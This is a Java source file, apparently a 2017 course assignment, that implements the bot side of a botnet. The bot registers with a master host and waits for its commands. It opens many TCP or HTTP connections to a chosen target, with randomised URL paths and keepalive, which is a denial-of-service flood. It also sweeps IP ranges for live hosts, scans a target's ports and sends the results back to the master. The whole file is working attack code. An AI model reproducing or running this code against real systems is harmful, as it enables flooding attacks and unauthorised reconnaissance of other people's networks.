import java.io.*;
import java.util.*;
import java.net.*;
import java.time.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Deque;
import java.util.concurrent.LinkedBlockingDeque;
/* 
	CMPE 206
	3/6/2017
	Timothy Fong
*/

// Y number of SlaveBots connect as a ClientSocket on port X

public class SlaveBot {
	
	private volatile boolean listening = true;
	// set arbitrary slave port
	private final static int SLAVE_SERVER_PORT = 2020;
    private final String masterIPAddressOrHostName;
    private final int masterPort; 
    private Deque<ConnectionThread> connectionThreadDeque = new LinkedBlockingDeque<>();
    public static ArrayList<String> Ping = new ArrayList<String>();
    public static ArrayList<String> PortList = new ArrayList<String>();
    
    public static void main(String[] args) {
    	// -h IPAddress|Hostname 
    	// (of Master -p port where master is listening for connections)
        if (args.length < 4) {
        	instructions();
            System.exit(-1);
            return;
        }

        // -h
        String arg1 = args[0];
        // master IPaddress
        String arg2 = args[1];
        // -p 
        String arg3 = args[2];
        // master PortNumber
        String arg4 = args[3];
        // if cases for wrong input
        if (!"-h".equals(arg1)) {
        	instructions();
			System.exit(-1);
            return;
        }
        if (!"-p".equals(arg3)) {
        	instructions();
			System.exit(-1);
            return;
        }
        // read IPaddress and PortNumber and start SlaveBot
        try {
            int portNumber = Integer.parseInt(arg4);
            SlaveBot slaveBot = new SlaveBot(arg2, portNumber);
            slaveBot.start();
        } 
        catch (NumberFormatException e) {
            e.printStackTrace();
            instructions();
            System.exit(-1);
            return;
        }
    }

    // Instructions how to start Slavebot
    private static void instructions() {
        System.out.println("Usage: -h IPAddress|Hostname -p port");
    }
    // standard print
    private static void print(String s) {
      System.out.println(s);
    }
    
    // constructor to create a Slavebot that stores master's connection info
    public SlaveBot(String masterIPAddressOrHostName, int masterPort) {
        this.masterIPAddressOrHostName = masterIPAddressOrHostName;
        this.masterPort = masterPort;
    }

    // start creating slaves' sockets and commanding them
    public void start() {
        register();
        startSlaveServer();
    }

    // method to register slaves' socket ports to attack  
    private void register() {
        new SlaveRegisterThread().start();
    }

    // method to start slave's serversocket to command other sockets
    private void startSlaveServer() {
        new SlaveServerThread().start();
    }
    
    // Thread method to register slaves' socket ports 
    class SlaveRegisterThread extends Thread {
        public SlaveRegisterThread() {
            super("SlaveRegisterThread");
        }
		// change original thread run() 
        @Override
        public void run() {
            try (
                Socket socket = new Socket(masterIPAddressOrHostName, masterPort);
                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            ) 
            {
                // REGISTER IP:PORT
                String registerMessage = getRegisterMessage();
                print(registerMessage);
                out.println(registerMessage);
                String inputLine = input.readLine();
                if (inputLine.equals("ACK REGISTER")) {
                    print("REGISTER DONE");
                } else {
                    print("REGISTER FAILED");
                }
            } 
            catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    
    // connect with the master and confirm connection
    private String getRegisterMessage() throws UnknownHostException {
        InetAddress localHost = InetAddress.getLocalHost();
        String hostName = localHost.getHostName();
        String ip = localHost.getHostAddress();
        return "REGISTER " + hostName + ":" + ip + ":" + getSlaveServerPort();
    }

    // output slave port
    private int getSlaveServerPort() {
        return SLAVE_SERVER_PORT;
    }
    
    // Thread method to initialize a serversocket to communication with slaves' subsockets
    class SlaveServerThread extends Thread {
        public SlaveServerThread() {
            super("SlaveServerThread");
        }

        @Override
        public void run() {
            try (ServerSocket serverSocket = new ServerSocket(SLAVE_SERVER_PORT)) 
            {
                while (listening) {
                    Socket socket = serverSocket.accept();
                    executeCommandThread(socket);
                }
            } 
            catch (IOException e) {
                e.printStackTrace();
            }
        }
        private void executeCommandThread(Socket socket) {
            try (
                    PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                    BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            ) 
            {
                String inputLine = input.readLine();
                print(getName() + " " + inputLine);

                if (inputLine.startsWith("connect")) {
                    connect(inputLine);
                } 
                else if (inputLine.startsWith("disconnect")) {
                    disconnect(inputLine);
                }
                else if (inputLine.startsWith("ipscan")) {
                	ipscan(inputLine);
//                	Thread t = new Thread(new Runnable()) {
//                		@Override
//                		public void run() {
//                			
//                		}
//                	}
                }
                else if (inputLine.startsWith("tcpportscan")) {
                	tcpportscan(inputLine);
                }
                String outputLine = "ACK";
                out.println(outputLine);
                socket.close();
            } 
            catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    
    // connect method. when receiving connect command from master implement this method
    private void connect(String inputLine) {
        String[] arr = inputLine.split(" ");
		// check for ip
        String ip = arr[1];
		// check for port
        int port = Integer.parseInt(arr[2]);
		// check for numberOfConnections
        int numberOfConnections = Integer.parseInt(arr[3]);
		// check if keepalive
        boolean keepAlive = arr[4].equals("keepalive=true");
		// check if url
        String strUrl = arr[5];
        /*String path =
                strUrl.length() > "url=".length()
                ?
                (strUrl.substring("url=".length()) + getUrlQ())
                :
                "";*/
		String path;
		if(strUrl.length() > "url=".length()) {
			path = (strUrl.substring("url=".length()) + getUrlQ());
		}
		else {
			path = "";
		}
        for (int i = 0; i < numberOfConnections; i++) {
            ConnectionThread connectionThread = new ConnectionThread(ip, port, keepAlive, path);
            connectionThreadDeque.offer(connectionThread);
            connectionThread.start();
        }
    }

	// get random url method
	private static String getUrlQ() {
        Random r = new Random();
        int len = r.nextInt(10) + 1;
        r = new Random();
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < len; i++) {
            int num = r.nextInt(52);
            if (num < 26) {
                sb.append((char)(num + 'a'));
            } else {
                sb.append((char)(num - 26 + 'A'));
            }
        }
        return sb.toString();
    }
	
    // disconnect all, disconnect command from master
    private void disconnect(String inputLine) {
        String[] arr = inputLine.split(" ");
        String arg0 = arr[0];
        String ip = arr[1];
        String port = arr[2];

        // print("disconnect: " + inputLine);

        List<ConnectionThread> toRemove = new ArrayList<>();
        for (ConnectionThread connectionThread : connectionThreadDeque) {
            if (connectionThread.getIP().equals(ip) &&
                    (port.equals("all") || port.equals("" + connectionThread.getPort()))) {
                connectionThread.disconnect();
                toRemove.add(connectionThread);
            }
        }
        connectionThreadDeque.removeAll(toRemove);
    }
    
    // ipscan method
    private void ipscan(String inputLine) {
    	String [] arr = inputLine.split(" ");
    	String arg0 = arr[0];
        String ip1 = arr[1];
        String ip2 = arr[2];
        String [] begin = ip1.split("\\.");
        String [] end = ip2.split("\\.");
        
        ScanThread scanThread = new ScanThread(begin, end);
        scanThread.start(); 
    }
    
    // tcpportscan method
    private void tcpportscan(String inputLine) {
    	String [] arr = inputLine.split(" ");
    	String arg0 = arr[0];
    	// check for target ip
        String target = arr[1];
        String port1 = arr[2];
        String port2 = arr[3];
        int start = Integer.parseInt(port1);
        int end = Integer.parseInt(port2);
        
        PortScanThread tcpscan = new PortScanThread(target, start, end);
        tcpscan.start();
    }
    
	// Thread method to connect to sub-sockets
    class ConnectionThread extends Thread {
        private Socket connectionThreadSocket = null;

        private final String host;
        private final int port;
        private final String path;
        private volatile boolean keepAlive;
        private Object lock = new Object();

        public ConnectionThread(String host, int port, boolean keepAlive, String path) {
            super("ConnectionThread");
            this.host = host;
            this.port = port;
            this.keepAlive = keepAlive;
            this.path = path;
        }
		
		// change run method for thread
        @Override
        public void run() {
            print(getName() + " " + host + " " + port);
            if (path != null && path.length() > 0) {
                sendHttpGet();
            } else {
                sendTcp();
            }
            print(getName() + " DONE");
        }

        private void sendTcp() {
            try {
                connectionThreadSocket = new Socket(host, port);
                if (keepAlive) {
                    connectionThreadSocket.setKeepAlive(true);
                }
                print(getName() + " local port:" + connectionThreadSocket.getLocalPort());
                BufferedReader in = new BufferedReader(new InputStreamReader(connectionThreadSocket.getInputStream()));
                print(getName() + " readLine from target " + in.readLine());
            } 
			catch (IOException e) {
                print(e.getMessage());
            } 
			finally {
                if (connectionThreadSocket != null) {
                    try {
                        connectionThreadSocket.close();
                    } 
					catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
        }

		// add set keepalive function to true
        private void sendHttpGet() {
            try {
                connectionThreadSocket = new Socket(host, port);
                connectionThreadSocket.setKeepAlive(true);
                PrintWriter pw = new PrintWriter(connectionThreadSocket.getOutputStream());
                String path = (this.path != null && this.path.length() > 0) ? this.path : "/";
				
				print(getName() + " local port:" + connectionThreadSocket.getLocalPort());
                print("sendHttpGet path " + path);
                pw.print("GET " + path + " HTTP/1.1\r\n");
                pw.println("Host: " + this.host + "\r\n\r\n");
                pw.flush();
                BufferedReader in = new BufferedReader(new InputStreamReader(connectionThreadSocket.getInputStream()));
                String line;
                /*while((line = in.readLine()) != null || (line = in.readLine()) != "</script></div></body></html>") {
                    print(line);
					/*if(line.contains("</html>")) {
						break;
					}	
				}*/
				line = in.readLine();
				print(line);
            } 
			catch (IOException e) {
                print(e.getMessage());
            } 
			/*finally {
                if (connectionThreadSocket != null) {
                    try {
                        connectionThreadSocket.close();
                    } 
					catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }*/
        }

		// close socket on disconnect
		// reset keepalive to false
        private void disconnect() {
            print("disconnect");
            if (connectionThreadSocket != null) {
                try {
                    synchronized (lock) {
                        // print("connectionThreadSocket.close()");
                        connectionThreadSocket.close();
                        keepAlive = false;
                    }
                } 
				catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        public String getIP() {
            return host;
        }

        public int getPort() {
            return port;
        }
    }
    
    // IPSCAN Thread 
    class ScanThread extends Thread {
        private Socket ScanThreadSocket = null;
        // store string arrays for ipaddresses
        private final String [] begin;
        private final String [] end;

        // constructors
        public ScanThread(String [] begin, String [] end) {
            super("ConnectionThread");
            this.begin = begin;
            this.end = end;
        }
        
        // change run method for thread
        @Override
        public void run() {
        	// make sure Ping arraylist is empty
        	Ping.clear();
        	// 4 for loops to loop through each part of IP address
            for(int i = Integer.parseInt(begin[0]); i <= Integer.parseInt(end[0]); i++) {
            	for(int j = Integer.parseInt(begin[1]); j <= Integer.parseInt(end[1]); j++) {
            		for(int k = Integer.parseInt(begin[2]); k <= Integer.parseInt(end[2]); k++) {
            			for(int l = Integer.parseInt(begin[3]); l <= Integer.parseInt(end[3]); l++) {
            				// Rebuild a string for each address tested
            				StringBuilder sb = new StringBuilder();
            				sb.append(Integer.toString(i) + ".");
            				sb.append(Integer.toString(j) + ".");
            				sb.append(Integer.toString(k) + ".");
            				sb.append(Integer.toString(l));
            				String address = sb.toString();
//            				System.out.println(address);
            				// test if address pings back
            				try {
    	        				String line;
    	        				InetAddress target = InetAddress.getByName(address);
    	        				// if yes then add to Ping arraylist
    	        				if(target.isReachable(200)) {
    	        					Ping.add(address);
	        					}
            				}
            				catch (IOException e) 
            				{
            	                e.printStackTrace();
            	            }
            			}
            		}
            	}
            }
            try {
            	// create a socket to communicate with Master
	            Socket soc = new Socket(masterIPAddressOrHostName, masterPort);
	            // PrintWrite to write to Master
	        	PrintWriter out = new PrintWriter(soc.getOutputStream(), true);
	        	// print DONE
	        	out.println("DONE");
	        	// send to Master DONE
	        	out.flush();
	        	// print IP list size
	        	out.println(Ping.size());
	        	// send to Master the IP list size
	        	out.flush();
	        	// loop through IP list and print
	            for(int count = 0; count < Ping.size(); count++) {
	                out.println(Ping.get(count));
	                System.out.println(Ping.get(count));
	            }
	            // send all data to Master
	            out.flush();
	            // print END
	            out.println("END");
	            // send to Master
	            out.flush();
	            // close socket
	            soc.close();
            }
            catch (IOException e) {
                print(e.getMessage());
            } 
        }
    }
    
    // PortScan Thread method
    class PortScanThread extends Thread {
        private Socket PortScanThreadSocket = null;

        // store target IP
        // store starting port number
        // store ending port number
        private final String IPaddress;
        private final int start;
        private final int end;
        Socket tcpsoc;
        

        // constructor
        public PortScanThread(String IPaddress, int start, int end) {
            super("PortScanThread");
            this.IPaddress = IPaddress;
            this.start = start;
            this.end = end;
        }
        
        // change run method
        @Override
        public void run() {
//        	System.out.println(start);
//    		System.out.println(end);
    		// make sure PortList is empty
    		PortList.clear();
    		// create socket to loop through TCP Ports
//	    		Socket tcpsoc = new Socket();
	    		// loop from starting to ending port
	        	for(int i = start; i < (end + 1); i++) {
	        		// Note if try is set before the
	        		try {
		        		// connect to IPaddress with a socket
		        		tcpsoc = new Socket();
		        		tcpsoc.connect(new InetSocketAddress(IPaddress, i), 200);
		        		// if a socket connects then add to list
		        		if(tcpsoc.isConnected()) {
		        			PortList.add(Integer.toString(i));
		        		}
		        		// always close socket when done
		        		tcpsoc.close();
	        		}
	        		catch (IOException e) {
	                    print(e.getMessage());
	                }
	        	}
        		// test portlist
//        		for(int count = 0; count < PortList.size(); count++) {
//	                System.out.println(PortList.get(count));
//	//                out.flush();
//	            }
    		// same communication method as IPSCAN to Master
    		try {
            	// create a socket to communicate with Master
	            Socket soc = new Socket(masterIPAddressOrHostName, masterPort);
	            // PrintWrite to write to Master
	        	PrintWriter out = new PrintWriter(soc.getOutputStream(), true);
	        	// print DONE
	        	out.println("DONE");
	//        	System.out.println(PortList);
	        	// send to Master DONE
	        	out.flush();
	        	// print tcp list size
	        	out.println(PortList.size());
	        	// send to Master the list size
	        	out.flush();
	        	// loop through tcp list and print
	            for(int count = 0; count < PortList.size(); count++) {
	                out.println(PortList.get(count));
	                System.out.println(PortList.get(count));
	//                out.flush();
	            }
	            // send all data to Master
	            out.flush();
	            // print END
	            out.println("END");
	            // send to Master
	            out.flush();
	            // close socket
	            soc.close();
            }
            catch (IOException e) {
                print(e.getMessage());
            }
        }
    }
}
